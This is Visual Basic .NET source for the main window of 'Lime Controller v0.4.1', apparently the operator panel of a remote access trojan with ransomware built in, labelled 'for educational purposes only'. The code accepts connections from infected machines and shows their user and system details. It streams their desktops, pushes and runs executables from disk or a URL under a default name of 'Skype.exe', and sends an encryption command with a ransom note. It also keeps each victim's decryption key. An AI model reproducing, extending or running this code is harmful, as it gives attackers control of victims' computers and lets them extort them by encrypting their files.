﻿
'##################################################################
'##           N Y A N   C A T  ||  Last edit MAR./14/2018        ##
'##################################################################
'##                                                              ##
'##                                                              ##
'##                                                              ##
'##            ░░░░░░░░░░▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄░░░░░░░░░           ##
'##            ░░░░░░░░▄▀░░░░░░░░░░░░▄░░░░░░░▀▄░░░░░░░           ##
'##            ░░░░░░░░█░░▄░░░░▄░░░░░░░░░░░░░░█░░░░░░░           ##
'##            ░░░░░░░░█░░░░░░░░░░░░▄█▄▄░░▄░░░█░▄▄▄░░░           ##
'##            ░▄▄▄▄▄░░█░░░░░░▀░░░░▀█░░▀▄░░░░░█▀▀░██░░           ##
'##            ░██▄▀██▄█░░░▄░░░░░░░██░░░░▀▀▀▀▀░░░░██░░           ##
'##            ░░▀██▄▀██░░░░░░░░▀░██▀░░░░░░░░░░░░░▀██░           ##
'##            ░░░░▀████░▀░░░░▄░░░██░░░▄█░░░░▄░▄█░░██░           ##
'##            ░░░░░░░▀█░░░░▄░░░░░██░░░░▄░░░▄░░▄░░░██░           ##
'##            ░░░░░░░▄█▄░░░░░░░░░░░▀▄░░▀▀▀▀▀▀▀▀░░▄▀░░           ##
'##            ░░░░░░█▀▀█████████▀▀▀▀████████████▀░░░░           ##
'##            ░░░░░░████▀░░███▀░░░░░░▀███░░▀██▀░░░░░░           ##
'##            ░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░           ##
'##                                                              ##
'##                 .. Lime Controller v0.4.1 ..                 ##
'##                                                              ##
'##                                                              ##
'##                                                              ##
'##################################################################
'##    This project was created for educational purposes only    ##
'##################################################################




Public Class Form1
    Public WithEvents S As New SocketServer
    Public SPL As String = "|'L'|"
    Private m_SortingColumn As ColumnHeader
    Public Shared F As Form1
    Public Shared MYPORT As Integer


#Region "Form Events"


    Private Sub Form1_FormClosing(ByVal sender As Object, ByVal e As System.Windows.Forms.FormClosingEventArgs) Handles Me.FormClosing
        NotifyIcon1.Dispose()
        End
    End Sub
    Private Sub Form1_Load(ByVal sender As System.Object, ByVal e As System.EventArgs) Handles Me.Load
        Control.CheckForIllegalCrossThreadCalls = False

        Try
            MYPORT = InputBox("Select Port", "", My.Settings.port)
            If Not MYPORT = Nothing Then
                S.Start(MYPORT)
                My.Settings.port = MYPORT
            End If
        Catch ex As Exception
            MsgBox(ex.Message)
            End
        End Try

        Try
            Messages("Connection", "Established!")
        Catch ex As Exception
        End Try

        Me.Text = "Lime Controller v0.4.1"

    End Sub
#End Region


#Region "Server Events"
    Sub Disconnect(ByVal sock As Integer) Handles S.DisConnected
        Try
            L1.Items(sock.ToString).Remove()
            Messages("{" + S.IP(sock.ToString) + "}", "Disconnected")
        Catch ex As Exception
        End Try
    End Sub

    Sub Connected(ByVal sock As Integer) Handles S.Connected
        Messages("{" + S.IP(sock.ToString) + "}", "Connected")
    End Sub

    Delegate Sub _Data(ByVal sock As Integer, ByVal B As Byte())
    Sub Data(ByVal sock As Integer, ByVal B As Byte()) Handles S.Data
        Dim T As String = BS(B)
        Dim A As String() = Split(T, SPL)
        Try
            Select Case A(0)
                Case "~" ' Client Sent me PC name
                    SyncLock L1.Items
                        Dim L = L1.Items.Add(sock.ToString, S.IP(sock), 0)
                        L.SubItems.Add(A(1))
                        L.SubItems.Add(A(2))
                        L.SubItems.Add(A(3))
                        L.SubItems.Add(A(4))
                        L.SubItems.Add(A(5))
                        L.Tag = sock
                    End SyncLock
                    Fix()

                    NotifyIcon1.BalloonTipIcon = ToolTipIcon.None
                    NotifyIcon1.BalloonTipText = "User: " + A(2) + vbNewLine + "IP: " + S.IP(sock)
                    NotifyIcon1.BalloonTipTitle = "Lime Controller | New Connection!"
                    NotifyIcon1.ShowBalloonTip(600)

                Case "!R"
                    SyncLock L1.Items
                        L1.Items(sock.ToString).SubItems(5).Text = A(1).ToString
                    End SyncLock
                    Fix()

                Case "!" ' i recive size of client screen
                    ' lets start Cap form and start capture desktop
                    If My.Application.OpenForms("!" & sock) IsNot Nothing Then Exit Sub
                    If Me.InvokeRequired Then
                        Dim j As New _Data(AddressOf Data)
                        Me.Invoke(j, New Object() {sock, B})
                        Exit Sub
                    End If
                    Dim cap As New Cap
                    cap.F = Me
                    cap.Sock = sock
                    cap.Name = "!" & sock
                    cap.Sz = New Size(A(1), A(2))
                    cap.Show()

                Case "@" ' i recive image  
                    Dim F As Cap = My.Application.OpenForms("!" & sock)
                    If F IsNot Nothing Then
                        If A(1).Length = 1 Then
                            F.Text = "Size: " & siz(B.Length) & " ,No Changes"
                            If F.Button1.Text = "Stop" Then
                                S.Send(sock, "@" & SPL & F.C1.SelectedIndex & SPL & "5" & SPL & F.C.Value)
                            End If
                            Exit Sub
                        End If
                        Dim BB As Byte() = fx(B, "@" & SPL)(1)
                        F.PktToImage(BB)
                    End If

                Case "Details"
                    If My.Application.OpenForms("D" & sock) IsNot Nothing Then Exit Sub
                    If Me.InvokeRequired Then
                        Dim j As New _Data(AddressOf Data)
                        Me.Invoke(j, New Object() {sock, B})
                        Exit Sub
                    End If
                    Dim D As New Details
                    D.F = Me
                    D.Sock = sock
                    D.Name = "D" & sock
                    D.Text = "Details" + "_" + S.IP(sock.ToString)
                    D.Show()

                    D.ListView1.Items.Clear()

                    D.ListView1.Columns.Add("")
                    D.ListView1.Columns.Add("")

                    D.ListView1.Items.Add("ID ").SubItems.Add(A(1))
                    D.ListView1.Items.Add("User ").SubItems.Add(A(2))
                    D.ListView1.Items.Add("Connection ").SubItems.Add(A(11))
                    D.ListView1.Items.Add("Stub ").SubItems.Add(A(3))
                    D.ListView1.Items.Add("CPU ").SubItems.Add(A(4))
                    D.ListView1.Items.Add("GPU ").SubItems.Add(A(5))
                    D.ListView1.Items.Add("Privilege ").SubItems.Add(A(6))
                    D.ListView1.Items.Add("Machine Type ").SubItems.Add(A(7))
                    D.ListView1.Items.Add("Current Time ").SubItems.Add(A(8))
                    D.ListView1.Items.Add("Drivers List ").SubItems.Add(A(9))
                    D.ListView1.Items.Add("Last reboot ").SubItems.Add(A(10))
                    D.ListView1.AutoResizeColumns(ColumnHeaderAutoResizeStyle.HeaderSize)

                Case "MSG"
                    Messages("{" + S.IP(sock.ToString) + "}", A(1).ToString)

                Case "Key"

                    If Not IO.Directory.Exists("Users" + "\" + A(1).ToString) Then
                        IO.Directory.CreateDirectory("Users" + "\" + A(1).ToString)
                    End If
                    IO.File.WriteAllText("Users" + "\" + A(1).ToString + "\" + "KEY.txt", A(2))

                Case "DEL-KEY"
                    IO.File.Delete("Users" + "\" + A(1).ToString + "\" + "KEY.txt")

                Case "SC"
                    IO.File.WriteAllBytes("Users" + "\" + A(1).ToString + "\" + "SC.jpeg", Convert.FromBase64String(A(2)))
            End Select
        Catch ex As Exception
            MsgBox(ex.Message)
        End Try

    End Sub
#End Region


#Region "Logs"

    Public Sub Messages(ByVal user As String, ByVal msg As String)
        L2.Items.Add("[" + DateAndTime.Now.ToString("hh:mm:ss tt") + "]" + "  " + user + "  →  " + msg.ToString)
    End Sub

    Private Sub ListBox1_DrawItem(sender As System.Object, e As System.Windows.Forms.DrawItemEventArgs) Handles L2.DrawItem
        e.DrawBackground()

        If L2.Items(e.Index).ToString.Contains("Connected") Then
            e.Graphics.DrawString(L2.Items(e.Index).ToString(), e.Font, Drawing.Brushes.Lime, New Drawing.PointF(e.Bounds.X, e.Bounds.Y))

        ElseIf L2.Items(e.Index).ToString.Contains("Disconnected") Then
            e.Graphics.DrawString(L2.Items(e.Index).ToString(), e.Font, Drawing.Brushes.DarkRed, New Drawing.PointF(e.Bounds.X, e.Bounds.Y))

        ElseIf L2.Items(e.Index).ToString.Contains("Error!") Then
            e.Graphics.DrawString(L2.Items(e.Index).ToString(), e.Font, Drawing.Brushes.Red, New Drawing.PointF(e.Bounds.X, e.Bounds.Y))

        ElseIf L2.Items(e.Index).ToString.Contains("Established!") Then
            e.Graphics.DrawString(L2.Items(e.Index).ToString(), e.Font, Drawing.Brushes.LightSteelBlue, New Drawing.PointF(e.Bounds.X, e.Bounds.Y))
        Else
            e.Graphics.DrawString(L2.Items(e.Index).ToString(), e.Font, Drawing.Brushes.White, New Drawing.PointF(e.Bounds.X, e.Bounds.Y))
        End If
        e.DrawFocusRectangle()
    End Sub

    Private Sub L2_Click(sender As Object, e As EventArgs) Handles L2.Click
        L2.ClearSelected()
        ChTabcontrol1.Focus()
    End Sub
#End Region


#Region "Controller Options"


    Private Sub DiskToolStripMenuItem_Click(sender As Object, e As EventArgs) Handles DiskToolStripMenuItem.Click
        Try
            Dim o As New OpenFileDialog
            With o
                .Filter = ".exe (*.exe)|*.exe"
                .Title = "UPDATE"
            End With

            If o.ShowDialog = Windows.Forms.DialogResult.OK Then
                For Each x As ListViewItem In L1.SelectedItems
                    S.Send(x.Tag, "RunDisk" & SPL & o.FileName & SPL & Convert.ToBase64String(IO.File.ReadAllBytes(o.FileName)) & SPL & "update")
                Next
            End If
        Catch ex As Exception
        End Try
    End Sub

    Private Sub FromURLToolStripMenuItem_Click(sender As Object, e As EventArgs) Handles FromURLToolStripMenuItem.Click
        Dim URL As String = InputBox("Enter the direct link", "UPDATE", "http://site.com/file.exe")
        Dim EXE As String = InputBox("Enter the file name", "File Name", "Skype.exe")

        If String.IsNullOrEmpty(URL) Then
            Exit Sub
        Else
            For Each x As ListViewItem In L1.SelectedItems
                S.Send(x.Tag, "RunURL" & SPL & URL & SPL & EXE & SPL & "update")
            Next
        End If
    End Sub

    Private Sub RestartToolStripMenuItem_Click(sender As Object, e As EventArgs) Handles RestartToolStripMenuItem.Click
        For Each x As ListViewItem In L1.SelectedItems
            S.Send(x.Tag, "Reconnect")
        Next
    End Sub

    Private Sub CloseToolStripMenuItem_Click(sender As Object, e As EventArgs) Handles CloseToolStripMenuItem.Click
        For Each x As ListViewItem In L1.SelectedItems
            S.Send(x.Tag, "Close")
        Next
    End Sub

    Private Sub UninstallToolStripMenuItem_Click(sender As Object, e As EventArgs) Handles UninstallToolStripMenuItem.Click
        For Each x As ListViewItem In L1.SelectedItems
            S.Send(x.Tag, "Uninstall")
        Next
    End Sub

#End Region


#Region "Theme"

    Private Sub Fix()
        On Error Resume Next
        Me.L1.AutoResizeColumns(ColumnHeaderAutoResizeStyle.HeaderSize)
    End Sub

    Private Sub Form1_Resize(sender As Object, e As EventArgs) Handles Me.Resize
        On Error Resume Next
        Fix()
    End Sub

    Private Sub Timer1_Tick(sender As Object, e As EventArgs) Handles Timer1.Tick
        Try
            ToolStripStatusLabel1.Text = "LISTENING PORT [" & MYPORT & "]        ONLINE CLIENTS [" & L1.Items.Count & "]        SELECTED CLIENTS [" & L1.SelectedItems.Count & "]        AVAILABLE KEYS TO DECRYPT [" & KeyCount() & "]"
        Catch ex As Exception
        End Try
    End Sub

    Public Function KeyCount()
        Try
            If Not IO.Directory.Exists("Users") Then
                IO.Directory.CreateDirectory("Users")
            End If

            Dim fileCount As Integer = IO.Directory.GetFiles("Users", "KEY.txt", IO.SearchOption.AllDirectories).Length
            Return fileCount
        Catch ex As Exception
            Return "0"
        End Try
    End Function


    Private Sub L1_DrawColumnHeader(ByVal sender As Object, ByVal e As DrawListViewColumnHeaderEventArgs) Handles L1.DrawColumnHeader
        Using br = New Drawing.SolidBrush(Drawing.Color.Black)
            e.DrawBackground()
            e.Graphics.FillRectangle(br, e.Bounds)
            Dim headerFont As New Drawing.Font("Microsoft Sans Serif", 8, Drawing.FontStyle.Bold)
            e.Graphics.DrawString(e.Header.Text, headerFont, Drawing.Brushes.Lime, e.Bounds)
        End Using
    End Sub

    Private Sub L1_DrawItem(sender As Object, e As DrawListViewItemEventArgs) Handles L1.DrawItem
        e.DrawDefault = True
        If (e.ItemIndex Mod 2) = 1 Then
            e.Item.BackColor = Drawing.Color.Black
            e.Item.UseItemStyleForSubItems = True
        End If
    End Sub

    Private Sub L1_ColumnClick(ByVal sender As System.Object, ByVal e As ColumnClickEventArgs) Handles L1.ColumnClick
        On Error Resume Next
        ' Get the new sorting column.
        Dim new_sorting_column As ColumnHeader = L1.Columns(e.Column)

        ' Figure out the new sorting order.
        Dim sort_order As System.Windows.Forms.SortOrder
        If m_SortingColumn Is Nothing Then
            ' New column. Sort ascending.
            sort_order = SortOrder.Ascending
        Else
            ' See if this is the same column.
            If new_sorting_column.Equals(m_SortingColumn) Then
                ' Same column. Switch the sort order.
                If m_SortingColumn.Text.StartsWith("> ") Then
                    sort_order = SortOrder.Descending
                Else
                    sort_order = SortOrder.Ascending
                End If
            Else
                ' New column. Sort ascending.
                sort_order = SortOrder.Ascending
            End If

            ' Remove the old sort indicator.
            m_SortingColumn.Text =
                m_SortingColumn.Text.Substring(2)
        End If

        ' Display the new sort order.
        m_SortingColumn = new_sorting_column
        If sort_order = SortOrder.Ascending Then
            m_SortingColumn.Text = "> " & m_SortingColumn.Text
        Else
            m_SortingColumn.Text = "< " & m_SortingColumn.Text
        End If

        ' Create a comparer.
        L1.ListViewItemSorter = New ListViewComparer(e.Column, sort_order)

        ' Sort.
        L1.Sort()
        Fix()
    End Sub
#End Region


#Region "Commands"

    Private Sub RemoteDesktopToolStripMenuItem_Click_1(sender As Object, e As EventArgs) Handles RemoteDesktopToolStripMenuItem.Click
        For Each x As ListViewItem In L1.SelectedItems
            S.Send(x.Tag, "!")
        Next
    End Sub

    Private Sub FromURLToolStripMenuItem1_Click(sender As Object, e As EventArgs) Handles FromURLToolStripMenuItem1.Click
        Dim URL As String = InputBox("Enter the direct link", "Run File", "http://site.com/file.exe")
        Dim EXE As String = InputBox("Enter the file name", "File Name", "Skype.exe")

        If String.IsNullOrEmpty(URL) Then
            Exit Sub
        Else
            For Each x As ListViewItem In L1.SelectedItems
                S.Send(x.Tag, "RunURL" & SPL & URL & SPL & EXE)
            Next
        End If
    End Sub

    Private Sub FromDiskToolStripMenuItem_Click(sender As Object, e As EventArgs) Handles FromDiskToolStripMenuItem.Click
        Try
            Dim o As New OpenFileDialog
            With o
                .Filter = ".exe (*.exe)|*.exe"
                .Title = "UPDATE"
            End With

            If o.ShowDialog = Windows.Forms.DialogResult.OK Then
                For Each x As ListViewItem In L1.SelectedItems
                    S.Send(x.Tag, "RunDisk" & SPL & o.FileName & SPL & Convert.ToBase64String(IO.File.ReadAllBytes(o.FileName)))
                Next
            End If
        Catch ex As Exception
        End Try
    End Sub

    Private Sub BuilderToolStripMenuItem_Click(sender As Object, e As EventArgs) Handles BuilderToolStripMenuItem.Click
        Builder.Show()
    End Sub

    Private Sub EncryptToolStripMenuItem_Click(sender As Object, e As EventArgs) Handles EncryptToolStripMenuItem.Click
        Dim R As New Ransomware
        R.ShowDialog()

        If R.OK = True Then
            For Each x As ListViewItem In L1.SelectedItems
                S.Send(x.Tag, "ENC" & SPL & R.RichTextBox1.Text & SPL & Convert.ToBase64String(IO.File.ReadAllBytes(R.PictureBox1.ImageLocation)))
            Next
        End If
    End Sub

    Private Sub DecryptionToolStripMenuItem_Click(sender As Object, e As EventArgs) Handles DecryptionToolStripMenuItem.Click
        Try
            For Each x As ListViewItem In L1.SelectedItems
                S.Send(x.Tag, "DEC" & SPL & IO.File.ReadAllText("Users" + "\" + x.SubItems(2).Text + "_" + x.SubItems(1).Text + "\" + "KEY.txt"))
            Next
        Catch ex As Exception
            MsgBox(ex.Message)
        End Try
    End Sub

    Private Sub DetailsToolStripMenuItem_Click(sender As Object, e As EventArgs) Handles DetailsToolStripMenuItem.Click
        For Each x As ListViewItem In L1.SelectedItems
            S.Send(x.Tag, "Details")
        Next
    End Sub


#End Region


End Class